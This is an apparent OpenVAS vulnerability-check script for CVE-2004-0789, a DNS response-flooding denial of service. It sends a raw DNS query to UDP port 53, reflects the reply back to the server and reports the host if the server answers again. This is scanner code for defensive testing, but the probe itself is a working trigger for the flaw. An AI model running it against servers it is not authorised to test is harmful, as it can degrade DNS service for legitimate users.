if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.15753" );
	script_version( "$Revision: 10415 $" );
	script_tag( name: "last_modification", value: "$Date: 2018-07-05 12:51:54 +0200 (Thu, 05 Jul 2018) $" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_bugtraq_id( 11642 );
	script_cve_id( "CVE-2004-0789" );
	script_name( "Multiple Vendor DNS Response Flooding Denial Of Service" );
	script_category( ACT_ATTACK );
	script_family( "Denial of Service" );
	script_copyright( "Copyright (C) 2004 Cedric Tissieres, Objectif Securite" );
	script_dependencies( "dns_server.sc", "global_settings.sc" );
	script_mandatory_keys( "DNS/identified" );
	script_exclude_keys( "keys/islocalhost" );
	script_xref( name: "URL", value: "https://web.archive.org/web/20041112055702/http://www.uniras.gov.uk/vuls/2004/758884/index.htm" );
	script_tag( name: "insight", value: "This vulnerability results in vulnerable DNS servers entering into an infinite
  query and response message loop, leading to the consumption of network and
  CPU resources, and denying DNS service to legitimate users." );
	script_tag( name: "impact", value: "An attacker may exploit this flaw by finding two vulnerable servers and
  set up a 'ping-pong' attack between the two hosts." );
	script_tag( name: "solution", value: "Please see the reference for platform specific remediations." );
	script_tag( name: "summary", value: "Multiple DNS vendors are reported susceptible to a denial of service
  vulnerability (Axis Communication, dnrd, Don Moore, Posadis)." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
if(islocalhost()){
	exit( 0 );
}
port = get_kb_item( "Services/udp/domain" );
if(!port){
	port = 53;
}
if(!get_udp_port_state( port )){
	exit( 0 );
}
soc = open_sock_udp( port );
if(!soc){
	exit( 0 );
}
my_data = NASLString( "\\xf2\\xe7\\x81\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x77" );
my_data += NASLString( "\\x77\\x77\\x06\\x67\\x6f\\x6f\\x67\\x6c\\x65\\x03\\x63\\x6f\\x6d\\x00" );
my_data += NASLString( "\\x00\\x01\\x00\\x01" );
send( socket: soc, data: my_data );
r = recv( socket: soc, length: 4096 );
if(r && ( ord( r[2] ) & 0x80 )){
	send( socket: soc, data: r );
	r = recv( socket: soc, length: 4096 );
	if(r && ( ord( r[2] ) & 0x80 )){
		security_message( port: port, proto: "udp" );
		exit( 0 );
	}
}
exit( 99 );

